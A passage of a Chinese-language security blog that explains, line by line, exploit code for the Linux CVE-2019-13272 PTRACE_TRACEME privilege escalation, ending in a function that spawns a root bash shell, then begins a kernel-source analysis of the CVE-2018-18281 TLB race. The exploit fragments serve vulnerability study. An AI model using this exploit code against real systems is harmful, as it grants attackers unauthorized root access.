*/</span></span><br><span class="line"> <span class="number">99</span>     <span class="built_in">puts</span>(<span class="string">"executing passwd"</span>);</span><br><span class="line"><span class="number">100</span>     execl(<span class="string">"/usr/bin/passwd"</span>, <span class="string">"passwd"</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">101</span>     err(<span class="number">1</span>, <span class="string">"execl passwd"</span>);</span><br><span class="line"><span class="number">102</span>   &#125;</span><br><span class="line"><span class="number">103</span> </span><br><span class="line"><span class="number">104</span>   SAFE(dup2(self_fd, <span class="number">0</span>));</span><br><span class="line"><span class="number">105</span>   SAFE(dup2(block_pipe[<span class="number">1</span>], <span class="number">1</span>));</span><br><span class="line"><span class="number">106</span> </span><br><span class="line"><span class="number">107</span>   <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pw</span> = <span class="title">getpwuid</span>(<span class="title">getuid</span>());</span></span><br><span class="line"><span class="number">108</span>   <span class="keyword">if</span> (pw == <span class="literal">NULL</span>) err(<span class="number">1</span>, <span class="string">"getpwuid"</span>);</span><br><span class="line"><span class="number">109</span> </span><br><span class="line"><span class="number">110</span>   middle_success = <span class="number">1</span>;</span><br><span class="line"><span class="number">111</span>   execl(<span class="string">"/tmp/fakepkexec"</span>, <span class="string">"fakepkexec"</span>, <span class="string">"--user"</span>, pw-&gt;pw_name, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">112</span>   middle_success = <span class="number">0</span>;</span><br><span class="line"><span class="number">113</span>   err(<span class="number">1</span>, <span class="string">"execl pkexec"</span>);</span><br><span class="line"><span class="number">114</span> &#125;</span><br></pre></td></tr></table></figure>

<p>行 70, 调用 fork 生成孙进程（也就是 task C）</p>
<p>然后行 111, task B 运行 fakepkexec 让自己提权再降权</p>
<p>然后看行 76 ~ 84, task C 检测到 task B 的 euid 变成 0 之后， 会执行行 91 进行 PTRACE_TRACEME 操作获取 root 的 ptracer_cred, 然后紧接着 task C 马上运行 execl 执行一个  suid binary 让自己的 euid 变成 0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">190</span>   <span class="comment">/*</span></span><br><span class="line"><span class="comment">191    * wait for our child to go through both execve() calls (first pkexec, then</span></span><br><span class="line"><span class="comment">192    * the executable permitted by polkit policy).</span></span><br><span class="line"><span class="comment">193    */</span></span><br><span class="line"><span class="number">194</span>   <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="number">195</span>     <span class="keyword">int</span> fd = <span class="built_in">open</span>(tprintf(<span class="string">"/proc/%d/comm"</span>, midpid), O_RDONLY);</span><br><span class="line"><span class="number">196</span>     <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line"><span class="number">197</span>     <span class="keyword">int</span> buflen = SAFE(<span class="built_in">read</span>(fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>));</span><br><span class="line"><span class="number">198</span>     buf[buflen] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="number">199</span>     *strchrnul(buf, <span class="string">'\n'</span>) = <span class="string">'\0'</span>;</span><br><span class="line"><span class="number">200</span>     <span class="keyword">if</span> (<span class="built_in">strncmp</span>(buf, basename(helper_path), <span class="number">15</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">201</span>       <span class="keyword">break</span>;</span><br><span class="line"><span class="number">202</span>     usleep(<span class="number">100000</span>);</span><br><span class="line"><span class="number">203</span>   &#125;</span><br><span class="line"><span class="number">204</span> </span><br><span class="line"><span class="number">205</span>   <span class="comment">/*</span></span><br><span class="line"><span class="comment">206    * our child should have gone through both the privileged execve() and the</span></span><br><span class="line"><span class="comment">207    * following execve() here</span></span><br><span class="line"><span class="comment">208    */</span></span><br><span class="line"><span class="number">209</span>   SAFE(ptrace(PTRACE_ATTACH, midpid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">210</span>   SAFE(waitpid(midpid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">211</span>   <span class="built_in">fputs</span>(<span class="string">"attached to midpid\n"</span>, <span class="built_in">stderr</span>);</span><br><span class="line"><span class="number">212</span> </span><br><span class="line"><span class="number">213</span>   force_exec_and_wait(midpid, <span class="number">0</span>, <span class="string">"stage2"</span>);</span><br><span class="line"><span class="number">214</span>   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>接下去回到 task A 的 main 函数， 行 194 ~ 202, task A 检测到 task B 的 binary comm 变成 helper 之后，<br>运行行 213 执行 force_exec_and_wait</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">116</span> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">force_exec_and_wait</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> exec_fd, <span class="keyword">char</span> *arg0)</span> </span>&#123;</span><br><span class="line"><span class="number">117</span>   <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line"><span class="number">118</span>   <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> = &#123;</span> .iov_base = &amp;regs, .iov_len = <span class="keyword">sizeof</span>(regs) &#125;;</span><br><span class="line"><span class="number">119</span>   SAFE(ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">120</span>   SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">121</span>   SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line"><span class="number">122</span> </span><br><span class="line"><span class="number">123</span>   <span class="comment">/* set up indirect arguments */</span></span><br><span class="line"><span class="number">124</span>   <span class="keyword">unsigned</span> <span class="keyword">long</span> scratch_area = (regs.rsp - <span class="number">0x1000</span>) &amp; ~<span class="number">0xfff</span>UL;</span><br><span class="line"><span class="number">125</span>   <span class="class"><span class="keyword">struct</span> <span class="title">injected_page</span> &#123;</span></span><br><span class="line"><span class="number">126</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> argv[<span class="number">2</span>];</span><br><span class="line"><span class="number">127</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> envv[<span class="number">1</span>];</span><br><span class="line"><span class="number">128</span>     <span class="keyword">char</span> arg0[<span class="number">8</span>];</span><br><span class="line"><span class="number">129</span>     <span class="keyword">char</span> path[<span class="number">1</span>];</span><br><span class="line"><span class="number">130</span>   &#125; ipage = &#123;</span><br><span class="line"><span class="number">131</span>     .argv = &#123; scratch_area + offsetof(struct injected_page, arg0) &#125;</span><br><span class="line"><span class="number">132</span>   &#125;;</span><br><span class="line"><span class="number">133</span>   <span class="built_in">strcpy</span>(ipage.arg0, arg0);</span><br><span class="line"><span class="number">134</span>   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(ipage)/<span class="keyword">sizeof</span>(<span class="keyword">long</span>); i++) &#123;</span><br><span class="line"><span class="number">135</span>     <span class="keyword">unsigned</span> <span class="keyword">long</span> pdata = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;ipage)[i];</span><br><span class="line"><span class="number">136</span>     SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line"><span class="number">137</span>                 (<span class="keyword">void</span>*)pdata));</span><br><span class="line"><span class="number">138</span>   &#125;</span><br><span class="line"><span class="number">139</span> </span><br><span class="line"><span class="number">140</span>   <span class="comment">/* execveat(exec_fd, path, argv, envv, flags) */</span></span><br><span class="line"><span class="number">141</span>   regs.orig_rax = __NR_execveat;</span><br><span class="line"><span class="number">142</span>   regs.rdi = exec_fd;</span><br><span class="line"><span class="number">143</span>   regs.rsi = scratch_area + offsetof(struct injected_page, path);</span><br><span class="line"><span class="number">144</span>   regs.rdx = scratch_area + offsetof(struct injected_page, argv);</span><br><span class="line"><span class="number">145</span>   regs.r10 = scratch_area + offsetof(struct injected_page, envv);</span><br><span class="line"><span class="number">146</span>   regs.r8 = AT_EMPTY_PATH;</span><br><span class="line"><span class="number">147</span> </span><br><span class="line"><span class="number">148</span>   SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov));</span><br><span class="line"><span class="number">149</span>   SAFE(ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="literal">NULL</span>));</span><br><span class="line"><span class="number">150</span>   SAFE(waitpid(pid, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">151</span> &#125;</span><br></pre></td></tr></table></figure>

<p>函数 force_exec_and_wait 的作用是使用 ptrace 控制 tracee 执行 execveat 函数替换进程的镜像, 这里它控制 task B 执行了 task A 的进程（即 exploit 的可执行程序）然后参数为 stage2, 这实际上就是让 task B 执行了 middle_stage2 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">167</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line"><span class="number">168</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage2"</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">169</span>     <span class="keyword">return</span> middle_stage2();</span><br><span class="line"><span class="number">170</span>   <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"stage3"</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">171</span>     <span class="keyword">return</span> spawn_shell();</span><br></pre></td></tr></table></figure>

<p>而 middle_stage2 函数同样调用了 force_exec_and_wait , 这将使 task B 利用 ptrace 控制 task C 执行 execveat 函数，将 task C 的镜像也替换为 exploit 的 binary, 且参数是 stage3</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">153</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">middle_stage2</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="number">154</span>   <span class="comment">/* our child is hanging in signal delivery from execve()'s SIGTRAP */</span></span><br><span class="line"><span class="number">155</span>   <span class="keyword">pid_t</span> child = SAFE(waitpid(<span class="number">-1</span>, &amp;dummy_status, <span class="number">0</span>));</span><br><span class="line"><span class="number">156</span>   force_exec_and_wait(child, <span class="number">42</span>, <span class="string">"stage3"</span>);</span><br><span class="line"><span class="number">157</span>   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">158</span> &#125;</span><br></pre></td></tr></table></figure>

<p>当 exploit binary 以参数 stage3 运行时，实际运行的是  spawn_shell 函数, 所以 task C 最后阶段运行的是 spawn_shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">160</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">spawn_shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="number">161</span>   SAFE(setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="number">162</span>   SAFE(setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="number">163</span>   execlp(<span class="string">"bash"</span>, <span class="string">"bash"</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">164</span>   err(<span class="number">1</span>, <span class="string">"execlp"</span>);</span><br><span class="line"><span class="number">165</span> &#125;</span><br></pre></td></tr></table></figure>

<p>在 spawn_shell 函数里， 它首先使用 setresgid/setresuid 将本进程的 real uid/effective uid/save uid 都变成 root, 由于 task C 刚刚已经执行了 suid binary 将自身的 euid 变成了 root, 所以这里的 setresuid/setresgid 可以成功执行，到此为止， task C 就变成了一个完全的 root 进程， 最后再执行 execlp 启动一个 shell, 即得到了一个完整 root 权限的 shell</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener"> broken permission and object lifetime handling for PTRACE_TRACEME</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/28/CVE-2019-13272/" data-id="cmd5slr2e000g0lo1adqib5us" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2019/03/08/cve-2018-18281" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2019/03/08/cve-2018-18281/" class="article-date">
  <time datetime="2019-03-08T16:53:40.000Z" itemprop="datePublished">2019-03-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2019/03/08/cve-2018-18281/">TLB 缓存延迟刷新漏洞 CVE-2018-18281 解析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author: <a href="mailto:chengjia4574@gmail.com">chengjia4574@gmail.com</a> of IceSword Lab , Qihoo 360</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>最近, 业内发现了一批内存管理系统的漏洞, project 0 的  <a href="https://twitter.com/tehjh" target="_blank" rel="noopener">Jann Horn</a> 放出了其中一个漏洞 <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1695" target="_blank" rel="noopener">CVE-2018-18281</a> 的 <a href="https://googleprojectzero.blogspot.com/2019/01/taking-page-from-kernels-book-tlb-issue.html" target="_blank" rel="noopener">writeup</a>, CVE-2018-18281 是一个 linux kernel 的通用漏洞, 这个漏洞的模式比较罕见, 不同于常规的内存溢出类漏洞, 也不是常见的 UAF 漏洞, 它是由内存管理系统的底层逻辑错误导致的, 根本原因是 TLB 缓存没有及时刷新造成虚拟地址复用, 可以实现较为稳定的提权利用. </p>
<h2 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h2><p>linux 内核通过 <a href="https://en.wikipedia.org/wiki/Page_table" target="_blank" rel="noopener">多级页表</a> 实现虚拟内存机制, 为了提高访问速度, 一些映射信息会被缓存在 <a href="https://en.wikipedia.org/wiki/Translation_lookaside_buffer" target="_blank" rel="noopener">TLB</a> 里, cpu 在访问一个虚拟地址的时候, 会先查找 TLB , 如果没有命中, 才去遍历主存里的多级页表, 并将查找到的映射关系填入 TLB</p>
<p>反过来, 如果某个映射关系要解除, 除了在主存里的相关表项要删除, 还需要对多个cpu core 同步执行 TLB 刷新, 使得在所有 TLB 缓存里该映射关系消除, 否则就会出现不一致. </p>
<p>上述关于 TLB 和内存映射的说明只是简化版本, 用于简单理解这个漏洞的原因, 真正的实现不同操作系统, 不同体系架构, 都不一样. 可以查阅芯片手册, 如 <a href="http://kib.kiev.ua/x86docs/SDMs/317080-002.pdf" target="_blank" rel="noopener">TLBs, Paging-Structure Caches, and Their Invalidation</a>  和一些分析, 如 <a href="https://www.cs.vu.nl/~herbertb/download/papers/revanc_ir-cs-77.pdf" target="_blank" rel="noopener">Reverse Engineering Hardware Page Table Caches</a></p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>先看两个系统调用</p>
<ul>
<li><a href="http://man7.org/linux/man-pages/man2/mremap.2.html" target="_blank" rel="noopener">mremap</a> 系统调用用来改变虚拟内存的映射区域</li>
<li><a href="https://linux.die.net/man/2/ftruncate" target="_blank" rel="noopener">ftruncate</a> 系统调用用来改变文件的大小到指定大小</li>
</ul>
<p>这两个系统调用表面上看八竿子打不着, 但在 linux 内核的实现里, 他们的调用链条会出现一个竞态条件异常</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1) sys_mremap() -&gt; mremap_to()-&gt;move_vma()-&gt;move_page_tables(). </span><br><span class="line">move_page_tables() first calls move_ptes() <span class="keyword">in</span> a loop, </span><br><span class="line"><span class="keyword">then</span> performs a TLB flush with flush_tlb_range().</span><br><span class="line"></span><br><span class="line">2) sys_ftruncate()-&gt;do_sys_ftruncate()-&gt;do_truncate()-&gt;notify_change()</span><br><span class="line">-&gt;shmem_setattr()-&gt;unmap_mapping_range()-&gt;unmap_mapping_range_tree()</span><br><span class="line">-&gt;unmap_mapping_range_vma() -&gt;zap_page_range_single()-&gt;unmap_single_vma()</span><br><span class="line">-&gt;unmap_page_range()-&gt;zap_pud_range()-&gt;zap_pmd_range()-&gt;zap_pte_range()</span><br><span class="line">can concurrently access the page tables of a process that is <span class="keyword">in</span> move_page_tables(), </span><br><span class="line">between the move_ptes() loop and the TLB flush.</span><br></pre></td></tr></table></figure>

<p>mremap 底层实现主要是 move_ptes 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">89</span> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">move_ptes</span><span class="params">(struct vm_area_struct *vma, <span class="keyword">pmd_t</span> *old_pmd,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">90</span>                 <span class="keyword">unsigned</span> <span class="keyword">long</span> old_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> old_end,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">91</span>                 struct vm_area_struct *new_vma, <span class="keyword">pmd_t</span> *new_pmd,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">92</span>                 <span class="keyword">unsigned</span> <span class="keyword">long</span> new_addr, <span class="keyword">bool</span> need_rmap_locks)</span></span></span><br><span class="line"><span class="function">93 </span>&#123;</span><br><span class="line"><span class="number">94</span>         <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="number">95</span>         <span class="class"><span class="keyword">struct</span> <span class="title">anon_vma</span> *<span class="title">anon_vma</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="number">96</span>         <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">vma</span>-&gt;<span class="title">vm_mm</span>;</span></span><br><span class="line"><span class="number">97</span>         <span class="keyword">pte_t</span> *old_pte, *new_pte, pte;</span><br><span class="line"><span class="number">98</span>         <span class="keyword">spinlock_t</span> *old_ptl, *new_ptl;</span><br><span class="line">======================== skip ======================</span><br><span class="line"><span class="number">133</span>         old_pte = pte_offset_map_lock(mm, old_pmd, old_addr, &amp;old_ptl);</span><br><span class="line"><span class="number">134</span>         new_pte = pte_offset_map(new_pmd, new_addr);</span><br><span class="line"><span class="number">135</span>         new_ptl = pte_lockptr(mm, new_pmd);</span><br><span class="line"><span class="number">136</span>         <span class="keyword">if</span> (new_ptl != old_ptl)</span><br><span class="line"><span class="number">137</span>                 spin_lock_nested(new_ptl, SINGLE_DEPTH_NESTING);</span><br><span class="line"><span class="number">138</span>         arch_enter_lazy_mmu_mode();</span><br><span class="line"><span class="number">139</span> </span><br><span class="line"><span class="number">140</span>         <span class="keyword">for</span> (; old_addr &lt; old_end; old_pte++, old_addr += PAGE_SIZE,</span><br><span class="line"><span class="number">141</span>                                    new_pte++, new_addr += PAGE_SIZE) &#123;</span><br><span class="line"><span class="number">142</span>                 <span class="keyword">if</span> (pte_none(*old_pte))</span><br><span class="line"><span class="number">143</span>                         <span class="keyword">continue</span>;</span><br><span class="line"><span class="number">144</span>                 pte = ptep_get_and_clear(mm, old_addr, old_pte);</span><br><span class="line"><span class="number">145</span>                 pte = move_pte(pte, new_vma-&gt;vm_page_prot, old_addr, new_addr);</span><br><span class="line"><span class="number">146</span>                 pte = move_soft_dirty_pte(pte);</span><br><span class="line"><span class="number">147</span>                 set_pte_at(mm, new_addr, new_pte, pte);</span><br><span class="line"><span class="number">148</span>         &#125;</span><br><span class="line"><span class="number">149</span> </span><br><span class="line"><span class="number">150</span>         arch_leave_lazy_mmu_mode();</span><br><span class="line"><span class="number">151</span>         <span class="keyword">if</span> (new_ptl != old_ptl)</span><br><span class="line"><span class="number">152</span>                 spin_unlock(new_ptl);</span><br><span class="line"><span class="number">153</span>         pte_unmap(new_pte - <span class="number">1</span>);</span><br><span class="line"><span class="number">154</span>         pte_unmap_unlock(old_pte - <span class="number">1</span>, old_ptl);</span><br><span class="line"><span class="number">155</span>         <span class="keyword">if</span> (anon_vma)</span><br><span class="line"><span class="number">156</span>                 anon_vma_unlock_write(anon_vma);</span><br><span class="line"><span class="number">157</span>         <span class="keyword">if</span> (mapping)</span><br><span class="line"><span class="number">158</span>                 i_mmap_unlock_write(mapping);</span><br><span class="line"><span class="number">159</span> &#125;</span><br></pre></td></tr></table></figure>

<p>结合上面代码, 有两点需要注意</p>
<ul>
<li>锁, 133 ~ 137 这几行目的是获取 pmd (pmd 指针指向一个存满了 pte 结构的页面) 的锁 (包括旧的和新的), 151 ~ 154 这几行是释放 pmd 锁</li>
<li>ptes 拷贝, 对一个 pmd 里的所有 pte 执行拷贝操作, 144 这一行调用 ptep_get_and_clear 将 old_pte 的值赋值给临时变量 pte 并清空旧的页表项, 147 这一行调用 set_pte_at 将刚刚的 pte 赋值给 new_pte 指针</li>
</ul>
<p>简单而言, move_ptes 将旧的 pmd 页的值 ( ptes ) 拷贝到了新的 pmd 页, 这就是 mremap 函数在底层的实现, 它并不需要删除旧地址对应的 pages, 只需要将旧地址关联到的 ptes 拷贝到新地址关联的页表, 这种拷贝是按照 pmd 为单位进行的, 每处理完一个 pmd, 对应的 pmd lock 就会释放.</p>
<p>ftruncate 函数将文件大小变为指定的大小, 如果新的值比旧的值小, 则需要将文件在内存的虚存空间变小, 这需要调用到 zap_pte_range 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1107</span> <span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">zap_pte_range</span><span class="params">(struct mmu_gather *tlb,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">1108</span>                                 struct vm_area_struct *vma, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">1109</span>                                 <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">end</span>,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">1110</span>                                 struct zap_details *details)</span></span></span><br><span class="line"><span class="function">1111 </span>&#123;          </span><br><span class="line"><span class="number">1112</span>         <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">tlb</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line"><span class="number">1113</span>         <span class="keyword">int</span> force_flush = <span class="number">0</span>;</span><br><span class="line"><span class="number">1114</span>         <span class="keyword">int</span> rss[NR_MM_COUNTERS];</span><br><span class="line"><span class="number">1115</span>         <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line"><span class="number">1116</span>         <span class="keyword">pte_t</span> *start_pte;</span><br><span class="line"><span class="number">1117</span>         <span class="keyword">pte_t</span> *pte;</span><br><span class="line"><span class="number">1118</span>         <span class="keyword">swp_entry_t</span> entry;</span><br><span class="line"><span class="number">1119</span> </span><br><span class="line"><span class="number">1120</span> again:</span><br><span class="line"><span class="number">1121</span>         init_rss_vec(rss);</span><br><span class="line"><span class="number">1122</span>         start_pte = pte_offset_map_lock(mm, pmd, addr, &amp;ptl);</span><br><span class="line"><span class="number">1123</span>         pte = start_pte;</span><br><span class="line"><span class="number">1124</span>         flush_tlb_batched_pending(mm);</span><br><span class="line"><span class="number">1125</span>         arch_enter_lazy_mmu_mode();</span><br><span class="line"><span class="number">1126</span>         <span class="keyword">do</span> &#123;</span><br><span class="line"><span class="number">1127</span>                 <span class="keyword">pte_t</span> ptent = *pte;</span><br><span class="line">========================== skip ==========================</span><br><span class="line"><span class="number">1146</span>                         ptent = ptep_get_and_clear_full(mm, addr, pte,</span><br><span class="line"><span class="number">1147</span>                                                         tlb-&gt;fullmm);</span><br><span class="line"><span class="number">1148</span>                         tlb_remove_tlb_entry(tlb, pte, addr);</span><br><span class="line">========================== skip ==========================</span><br><span class="line"><span class="number">1176</span>                 entry = pte_to_swp_entry(ptent);</span><br><span class="line">========================== skip ==========================</span><br><span class="line"><span class="number">1185</span>                 <span class="keyword">if</span> (unlikely(!free_swap_and_cache(entry)))</span><br><span class="line"><span class="number">1186</span>                         print_bad_pte(vma, addr, ptent, <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">1187</span>                 pte_clear_not_present_full(mm, addr, pte, tlb-&gt;fullmm);</span><br><span class="line"><span class="number">1188</span>         &#125; <span class="keyword">while</span> (pte++, addr += PAGE_SIZE, addr != <span class="built_in">end</span>);</span><br><span class="line"><span class="number">1189</span> </span><br><span class="line"><span class="number">1190</span>         add_mm_rss_vec(mm, rss);</span><br><span class="line"><span class="number">1191</span>         arch_leave_lazy_mmu_mode();</span><br><span class="line"><span class="number">1192</span> </span><br><span class="line"><span class="number">1193</span>         <span class="comment">/* Do the actual TLB flush before dropping ptl */</span></span><br><span class="line"><span class="number">1194</span>         <span class="keyword">if</span> (force_flush)</span><br><span class="line"><span class="number">1195</span>                 tlb_flush_mmu_tlbonly(tlb);</span><br><span class="line"><span class="number">1196</span>         pte_unmap_unlock(start_pte, ptl);</span><br><span class="line">========================== skip ==========================</span><br><span class="line"><span class="number">1212</span>         <span class="keyword">return</span> addr;</span><br><span class="line"><span class="number">1213</span> &#125;</span><br></pre></td></tr></table></figure>

<p>结合上面代码, 有三点需要注意, </p>
<ul>
<li>锁, 1122 行获取了 pmd 的锁, 1196 行释放了 pmd 的锁, 这里的 pmd 锁跟 move_ptes 函数里的是同一个东西</li>
<li>pte, 1146 行清空了页表项</li>
